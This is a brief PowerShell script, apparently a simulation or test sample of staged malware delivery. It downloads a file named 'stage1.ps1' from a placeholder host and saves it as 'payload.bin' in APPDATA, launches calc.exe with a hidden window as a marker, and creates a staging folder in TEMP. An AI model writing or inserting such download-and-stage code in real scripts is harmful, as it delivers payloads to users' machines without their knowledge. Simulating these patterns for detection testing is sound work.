
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://example.com/stage1.ps1",
    [string]$Stage2Path = "$env:APPDATA\payload.bin",
    [int]$RequestTimeout = 73
)
Invoke-WebRequest -Uri $TargetUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Start-Sleep -Seconds 4
